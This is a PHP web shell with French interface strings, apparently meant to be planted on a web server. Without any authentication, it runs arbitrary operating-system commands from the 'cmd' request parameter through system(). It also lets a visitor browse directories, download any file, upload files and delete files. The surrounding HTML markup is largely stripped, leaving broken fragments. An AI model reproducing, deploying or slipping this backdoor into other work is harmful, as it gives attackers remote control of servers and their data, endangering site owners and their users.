<?php
function good_link($link)
{
  $link=ereg_replace("/+","/",$link);
  $link=ereg_replace("/[^/(..)]+/\.\.","/",$link);
  $link=ereg_replace("/+","/",$link);
  if(!strncmp($link,"./",2) && strlen($link)>2)$link=substr($link,2);
  if($link=="")$link=".";
  return $link;
}

$dir=isset($_REQUEST['dir'])?$_REQUEST['dir']:".";
$dir=good_link($dir);
$rep=opendir($dir);
chdir($dir);

if(isset($_REQUEST["down"]) && $_REQUEST["down"]!="")
{
  header("Content-Type: application/octet-stream");
  header("Content-Length: ".filesize($_REQUEST["down"]));
  header("Content-Disposition: attachment; filename=".basename($_REQUEST["down"]));
  readfile($_REQUEST["down"]);
  exit();
}
?><?php
  echo "Actuellement dans <b>".getcwd()."</b><br>\n";
  echo "<b>dir = '$dir'</b><br>\n";
  echo "Cliquez sur un nom de fichier pour lancer son telechargement. Cliquez sur une croix pour effacer un fichier !<br><br>\n";
 
  if(isset($_REQUEST['cmd']) && $_REQUEST['cmd']!="")
  {
    echo "<pre>\n";
    system($_REQUEST['cmd']);
    echo "</pre>\n";
  }

  if(isset($_FILES["fic"]["name"]) && isset($_POST["MAX_FILE_SIZE"]))
  {
    if($_FILES["fic"]["size"]<$_POST["MAX_FILE_SIZE"])
    {
      if(move_uploaded_file($_FILES["fic"]["tmp_name"],good_link("./".$_FILES["fic"]["name"])))
      {
        echo "fichier telecharge dans ".good_link("./".$_FILES["fic"]["name"])."!<br>\n";
      }
      else echo "upload failed: ".$_FILES["fic"]["error"]."<br>\n";
    }
    else echo "fichier trop gros!<br>\n";
  }

  if(isset($_REQUEST['rm']) && $_REQUEST['rm']!="")
  {
    if(unlink($_REQUEST['rm']))echo "fichier ".$_REQUEST['rm']." efface !<br>\n";
    else echo "Impossible de supprimer le fichier<br>\n";
  }

?><?php
  $t_dir=array();
  $t_file=array();
  $i_dir=0;
  $i_file=0;
  while($x=readdir($rep))
  {
    if(is_dir($x))$t_dir[$i_dir++]=$x;
    else $t_file[$i_file++]=$x;
  }
  closedir($rep);
  while(1)
  {
?><?php
    if($x=each($t_dir))
    {
      $name=$x["value"];
      if($name=='.'){}
      elseif($name=='..') echo "    <a href='".$_SERVER['PHP_SELF']."?dir=".good_link("$dir/../")."'>UP</a><br><br>\n";
      else echo "    <a href='".$_SERVER['PHP_SELF']."?dir=".good_link("$dir/$name")."'>".$name."</a>\n";
    }
?><?php
    if($y=each($t_file))
    {
      if($y["key"]%2==0)echo " bgcolor='lightgreen'>\n";
      else echo ">\n";
      echo "    <a href='".$_SERVER['PHP_SELF']."?dir=$dir&down=".$y["value"]."'>".$y["value"]."</a>\n";
    }
    else echo ">\n";
?><?php
    if($y)
    {
      if($y["key"]%2==0)echo " bgcolor='lightgreen'";
      echo "><a href='".$_SERVER['PHP_SELF']."?dir=$dir&rm=".$y["value"]."'><b>X</b></a>";
    }
    else echo ">\n";
?><?php
    if(!$x && !$y)break;
  }
?><?php echo $_SERVER['PHP_SELF']; ?><?php echo $_SERVER['PHP_SELF']."?dir=$dir"; ?><?php echo $_SERVER['PHP_SELF']."?dir=$dir"; ?>